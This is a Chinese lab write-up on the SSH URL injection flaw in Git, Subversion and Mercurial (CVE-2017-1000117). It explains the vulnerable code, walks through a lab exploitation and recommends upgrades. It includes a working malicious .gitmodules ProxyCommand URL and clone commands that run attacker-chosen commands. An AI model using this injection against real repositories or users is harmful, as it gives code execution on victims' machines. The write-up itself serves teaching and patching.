@@ -1,0 +1,62 @@
+一、漏洞介绍
+前段时间，三款主流的源版本控制系统Git、Subversion (svn)、Mercurial，发布了更新补丁，修复了一个客户端代码执行漏洞。恶意的攻击者可以向受害者发送一条精心构造的ssh:// URL链接，当受害者访问这条URL则会触发漏洞导致执行恶意代码。该漏洞由GitLab的Brian Neel，Recurity Labs的Joan Schneeweiss和GitHub的Jeff King发现和报告。具体详情如下：
+漏洞编号：
+Git: CVE-2017-1000117
+Apache Subversion: CVE-2017-9800
+Mercurial: CVE-2017-1000116
+攻击者通过精心构造一个”ssh://…”URL链接发送给受害者，如果受害者访问了这个URL，则会导致恶意指令在客户端执行，从而获取主机权限。漏洞利用条件和方式:结合社会工程学远程钓鱼利用
+漏洞影响范围：
+Git：
+Git <v2.7.6 Git v2.8.6 Git v2.9.5 Git v2.10.4 Git v2.11.3 Git v2.12.4 Git v2.13.5
+Apache Subversion：
+Apache Subversion clients 1.0.0 through 1.8.18 (inclusive) Apache Subversion clients 1.9.0 through 1.9.6 (inclusive) Apache Subversion client 1.10.0-alpha3
+Mercurial:
+Mercurial<4.3
+二、漏洞原理分析
+恶意人员可以通过巧妙构造“ssh://…”链接，让受害人在执行程序等情况下访问该恶意链接，从而达到命令执行的目的。该链接可以被放在 git项目的.gitmodules文件下，这样当受害人对一个项目进行git clone --recurse-submodules操作时，就会引发安全问题。
+如下是我们漏洞环境的.gitmodules文件：
+[submodule "git"] path = git url = ssh://-oProxyCommand=sh<payload/wat
+该漏洞主要由于SSH链接在 hostname 部分，若是用“ - ”开头，那么会导致ssh命令将 hostname 误认为这是一个选项。因此，我们可以利用“ -oProxyCommand ”选项来达到命令执行的目的。
+在进行 git clone 时候会调用到 git/connect.c 中的以下函数：
+struct child_process *git_connect(int fd[2], const char *url,const char *prog, int flags)
+其接受到的参数url为命令中“ git clone xxx://xxxxxxxxxx/xx(.git) ”的 xxx://xxxxxxxxxx/xx(.git) 部分。在该函数中会对传入的这个字符串进行 parse ，提取其协议部分。在满足协议为 ssh:// 的时候会进入该函数的 else 部分。
+然后根据下面的流程调用本地的SSH:
+首先获得本地的ssh路径，然后push进 conn->args ，
+然后获得url中 ssh_host 部分再拼接路径，
+最后调用start_command函数进行命令执行。
+start_command 的定义在 git/run-command.c
+int start_command(struct child_process *cmd)
+将传入的cmd参数经过处理赋值给argv：
+经过 execve 这个函数进行命令执行。但是在这个这个命令执行的内容是 “ /usr/bin/ssh `ssh_host` path ”而ssh命令的-o参数在一定程度上是可以执行命令的:
+例如:
+ssh -oProxyCommand=gnome-calculator xxx
+将会在本地打开gnome的计算器。
+所以如果我们在clone操作的时候将连接指定为：
+git clone ssh://-oProxyCommand=gnome-calculator/cert
+将取得同样的命令执行的效果。
+三、漏洞利用
+我们在实验环境为大家准备的项目地址如下：
+http://172.16.12.2:8080/root/CVE-2017-1000117
+项目里包含的预定义命令在CVE-2017-1000117/payload：id > /var/www/html/vuls:
+首先来查看一下本机GIT版本，使用git --version命令：
+如上，我们看到，本机git版本并非最新版，有可能存在该漏洞。
+为了能验证payload是否执行成功，我们要保证本机存在payload中的目录/var/www/html，如果没有，请先创建（mkdir /var/www/html）,此目录仅用于漏洞验证：
+接着我们执行以下命令clone项目(实际利用场景有可能是被别有用心之人利用社会工程学欺骗所致)：
+git clone --recurse-submodules "http://172.16.12.2:8080/root/CVE-2017-1000117.git"
+如上图，可能会有报错，但不影响项目下载和恶意命令的执行：
+我们使用ls -al CVE-2017-1000117命令查看该项目被下载到的位置：
+如上可见，该项目被成功下载。
+那么，项目里的预定义的命令id > /var/www/html/vuls有没有被执行呢？我们使用ls -al /var/www/html/vuls命令验证是否生成文件:
+如上，文件成功生成。
+使用cat命令查看该文件，查看命令执行结果：
+如上图可见，项目里的预定义命令被成功执行。
+四、漏洞修复
+Git官方已经对该漏洞进行了修复。在v2.14.1的commit中，可以看到git_connect函数中执行之前对ssh_host进行了验证：
+验证内容为新增的这个函数:
+该函数对ssh_host的第一个字符进行了校验防止为"-"的情况抑制了向ssh传递参数的情况
+并且在多处对传入的host，port都做了该函数的过滤。
+用户只需要检查是否使用受影响范围内的版本，如果是，升级Git即可。
+漏洞修复建议
+Git：升级到Git v2.14.1版本
+Apache Subversion：升级到Subversion 1.8.19、 Subversion 1.9.7版本
+Mercurial：升级到Mercurial 4.3 and 4.2.3.版本
